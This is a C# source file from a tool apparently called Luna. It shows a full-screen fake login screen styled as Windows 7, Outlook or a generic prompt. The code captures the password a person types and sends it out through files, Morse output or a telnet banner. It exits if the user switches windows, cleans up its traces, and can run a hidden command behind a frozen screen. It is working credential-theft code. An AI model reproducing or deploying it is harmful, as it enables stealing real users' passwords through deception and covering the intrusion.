//Copyright(C) 2016  saintcrossbow@gmail.com

//This program is free software: you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see<http://www.gnu.org/licenses/>

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Collections;
using Microsoft.VisualBasic;

namespace Luna
{
    // To take advantage of any console writelines, change properties temporarily to a console app
    public partial class missionRun : Form
    {
        // Curtain and exfiltration 
        private Luna.CovertActions.ICurtain _curtain;
        private Luna.CovertActions.IExfiltrate _exfiltrate;

        // General use
        private bool shuttingDown = false;
        private string _capturedData = "";
        // Special case for covert run. Would like to see better method and still use delegate
        private string _executeCmd = "";
        const bool WIN7_STYLE_DECREASE_PASSWORD_BOX = false;

        // Action loop - if wanting to extend the project, a delegate may be added to missionRun
        private delegate void curtainAction();
        private List<curtainAction> curtainActionQueue = new List<curtainAction>();

        // Our target information
        public string SecretData
        {
            get { return _capturedData; }
            set { _capturedData = value; }
        }

        // Start the "mission" based on the curtain and set the exfiltration method
        // Any errors will cause a mission abort
        public missionRun(Luna.Common.CurtainStyle _curtainStyle, 
                          Luna.Common.ExfiltrationMethod _exfiltrateMethod,
                          string targetFile, string encryptKey)
        {
            try
            {
                InitializeComponent();

                // Set curtain based on selections
                switch (_curtainStyle)
                {
                    case Common.CurtainStyle.Win7:
                        _curtain = new Luna.curtainWin7();
                        curtainActionQueue.Add(showBackground);
                        curtainActionQueue.Add(showLoginInfo);
                        curtainActionQueue.Add(showLoginPassword);
                        break;

                    case Common.CurtainStyle.OutlookPrompt:
                        _curtain = new Luna.curtainOutlook();
                        curtainActionQueue.Add(showBackground);
                        curtainActionQueue.Add(showLoginPassword);
                        break;

                    case Common.CurtainStyle.GenericLogin:
                        _curtain = new Luna.curtainGeneric();
                        // Only two things to run
                        curtainActionQueue.Add(showBackground);
                        curtainActionQueue.Add(showLoginPassword);
                        break;

                    case Common.CurtainStyle.FreezeScreen:
                        // Special condition for running item in background after freezing the screen
                        _curtain = new Luna.curtainGeneric();
                        _executeCmd = targetFile;
                        curtainActionQueue.Add(showBackground);
                        curtainActionQueue.Add(runCommand);
                        break;
                }

                // ... as well as how we'll exfiltrate the data
                switch (_exfiltrateMethod)
                {
                    case Common.ExfiltrationMethod.PlainTextFile:                        
                        _exfiltrate = new Luna.FileExfiltrate();
                        _exfiltrate.targetFile = targetFile; 
                        break;
                    case Common.ExfiltrationMethod.EncryptedFile:
                        _exfiltrate = new Luna.FileExfiltrate();
                        _exfiltrate.targetFile = targetFile;
                        _exfiltrate.encyptKey = encryptKey;
                        break;
                    case Common.ExfiltrationMethod.Morse:
                        _exfiltrate = new Luna.MorseExfiltrate();
                        break;
                    case Common.ExfiltrationMethod.TelnetBanner:
                        _exfiltrate = new Luna.TelnetBannerExfiltrate();
                        break;
                }
                // Start it up
                showCurtain();
            }
            catch (Exception ex)
            {
                // We are not kind with errors - if we received one, we abort mission. May add a break here to
                // capture problems in testing
                missionShutdown();
            }
        }

        // Display the login screen of choice (a "curtain" to hide the magic)
        private void showCurtain()
        {
            foreach (Delegate action in curtainActionQueue)
                action.DynamicInvoke();
            this.Activate();
        }

        // The unique background for the target OS
        private void showBackground()
        {
            // Login background
            this.WindowState = FormWindowState.Maximized;
            this.BackgroundImage = _curtain.background;

            // Uncomment to get all resources
            /* System.Resources.ResourceSet resSet = new System.Resources.ResourceSet(thisLuna.GetManifestResourceStream("Luna.Properties.Resources.resources"));
             * foreach (DictionaryEntry resource in resSet)
             * {
             *    Console.WriteLine("\n[{0}] \t{1}", resource.Key, resource.Value); 
             * }
             *
             */
        }

        // Exfiltrate captured data using the exfiltration method specified 
        public void exfiltrateData()
        {
            _exfiltrate.secretData = _capturedData;
            _exfiltrate.exfiltrateData();
        }

        // Do everything necessary to close the application. Not much for us to do here, but may add in
        // items later. Note that under Program.startMission the ClearTracks methods will be called to
        // securely remove all temporary files
        public void missionShutdown()
        {
            if (!shuttingDown)
            {
                shuttingDown = true;
                Application.Exit();
            }
        }

        // Password captured from Win7 login
        private void loginPasswordWin7_Validated(object sender, EventArgs e)
        {
            _capturedData = loginPasswordWin7.Text;
            exfiltrateData();
            missionShutdown();
        }

        private void LoginEnter(object sender, System.Windows.Forms.KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)13)
            {
                // Enter key pressed - capture the data
                _capturedData = loginPasswordWin7.Text;
                exfiltrateData();
                missionShutdown();
            }
        }

        // If alt-tabbed, exit the program immediately
        private void missionRun_Deactivate(object sender, EventArgs e)
        {
            missionShutdown();
        }

        // Positioning code to show login view and password prompts
        // A lot of positioning the frames in the right place, would like to improve
#region Displaying and Positioning Code
        // Display login graphics
        private void showLoginInfo()
        {
            // Login picture (if available)
            if (_curtain.loginImage != null)
            {
                ActivateBox(loginPicture, _curtain.loginImage, true);
                this.loginPicture.Left = (int)(Screen.PrimaryScreen.Bounds.Size.Width / 2) -
                                         (int)(this.loginPicture.Width / 2);
                this.loginPicture.Top = (int)(Screen.PrimaryScreen.Bounds.Size.Height / 2) -
                                        (int)(this.loginPicture.Height);
            }
            else
                this.loginPicture.Visible = false;

            // Determine if we are using a user tile - and if so position it well
            switch (_curtain.userTilePostionMethod)
            {
                case ((int)Common.UserTilePositionMethod.Win7):
                    ActivateBox(userPicture, _curtain.userTile);
                    this.userPicture.Width = 128;
                    this.userPicture.Height = 128;
                    this.userPicture.Left = (int)(Screen.PrimaryScreen.Bounds.Size.Width / 2) -
                                                  (int)(this.userPicture.Width / 2);
                    this.userPicture.Top = (int)(((this.loginPicture.Height - this.userPicture.Height) / 2) +
                                                    this.loginPicture.Top);
                    break;
                case ((int)Common.UserTilePositionMethod.Undefined):
                default:
                    this.userPicture.Visible = false;
                    break;
            }

            // Show login name if appropriate
            if (!String.IsNullOrWhiteSpace(_curtain.userName))
            {
                ActivateText(this.loginName, _curtain.userName); 
                this.loginName.Left = (int)(Screen.PrimaryScreen.Bounds.Size.Width / 2) -
                                            (int)(this.userPicture.Width / 2);
                this.loginName.Width = (int)(this.userPicture.Width * 1.5);
                this.loginName.Top = (int)(this.loginPicture.Top + this.loginPicture.Height +
                                           (int)(this.loginPicture.Height / 5));

                // Login subtext name if appropriate
                if (!String.IsNullOrWhiteSpace(_curtain.userSubtext))
                {
                    ActivateText(this.loginSubText, _curtain.userSubtext);
                    this.loginSubText.Width = this.loginName.Width;
                    this.loginSubText.Left = (int)(Screen.PrimaryScreen.Bounds.Size.Width / 2) -
                                                  (int)(this.loginSubText.Width / 2);

                    this.loginSubText.Top = (int)(this.loginName.Top + this.loginName.Height);
                }
                else
                    this.loginSubText.Visible = false;
            }
            else
                this.loginName.Visible = false;
        }

        // Use a specific login style box
        private void showLoginPassword()
        {
            switch (_curtain.loginPasswordStyle)
            {
                case ((int)Common.PasswordBoxStyle.Undefined):
                    this.loginPasswordWin7.Visible = false;
                    break;
                case ((int)Common.PasswordBoxStyle.Win7):
                    this.loginPasswordWin7.Visible = true;
                    this.loginPasswordWin7.Width = (int)(this.userPicture.Width * 2);
                    this.loginPasswordWin7.Left = (int)(Screen.PrimaryScreen.Bounds.Size.Width / 2) -
                                                        (int)(this.loginPasswordWin7.Width / 2);
                    this.loginPasswordWin7.Top = (int)(this.loginSubText.Top + this.loginSubText.Height * 2);
                    // Show button if set in Win 7 style
                    if (_curtain.loginButton != null)
                    {
                        ActivateBox(loginButton, _curtain.loginButton, true);
                        // Decrease the password text box size to accomodate button
                        #if WIN7_STYLE_DECREASE_PASSWORD_BOX
                            this.loginPasswordWin7.Width = this.loginPasswordWin7.Width - (this.loginButton.Width + (int)(this.loginButton.Width * .1));
                        #endif
                        this.loginButton.Top = (int)(this.loginPasswordWin7.Top + this.loginPasswordWin7.Height / 2) -
                                                    (this.loginButton.Height / 2);
                        this.loginButton.Left = this.loginPasswordWin7.Left + this.loginPasswordWin7.Width + (int)(this.loginButton.Width * .1);
                    }
                    // ... and switch user if appropriate
                    if (_curtain.switchButton != null)
                    {
                        ActivateBox(switchButton, _curtain.switchButton, true);
                        this.switchButton.Top = (int)(this.loginPasswordWin7.Top + this.loginPasswordWin7.Height * 2);
                        this.switchButton.Left = (int)(Screen.PrimaryScreen.Bounds.Size.Width / 2) -
                                                       (int)(this.switchButton.Width / 2);
                    }
                    break;
                case ((int)Common.PasswordBoxStyle.OutlookPrompt):
                    this.IsMdiContainer = true;
                    loginDialog mdiLogin = new loginDialog(this);
                    mdiLogin.MdiParent = this;
                    mdiLogin.userID = LunaGeneral.bestUserName();
                    mdiLogin.Show();
                    break;
                case ((int)Common.PasswordBoxStyle.Generic):
                    this.IsMdiContainer = true;
                    loginGeneric mdiGeneric = new loginGeneric(this);
                    mdiGeneric.MdiParent = this;
                    mdiGeneric.userID = LunaGeneral.bestUserName();
                    mdiGeneric.Show();
                    break;
            }
        }

        // Methods to setup a picture box with a picture
        private void ActivateBox(PictureBox targetBox, Image targetImage)
        {
            ActivateBox(targetBox, targetImage, false);
        }

        private void ActivateBox(PictureBox targetBox, Image targetImage, bool isTransparent)
        {
            Bitmap loginBitmap = new Bitmap(targetImage);
            if (isTransparent)
                loginBitmap.MakeTransparent(Color.Black);
            targetBox.Image = loginBitmap;
            targetBox.Visible = true;
            targetBox.Parent = this;
            targetBox.BringToFront();
        }

        private void ActivateText(Label targetLabel, string targetText)
        {
            targetLabel.Text = targetText;
            targetLabel.Visible = true;
        }
#endregion

        private void runCommand()
        {
            LunaGeneral.startCommand(_executeCmd, false);
        }
    }
}
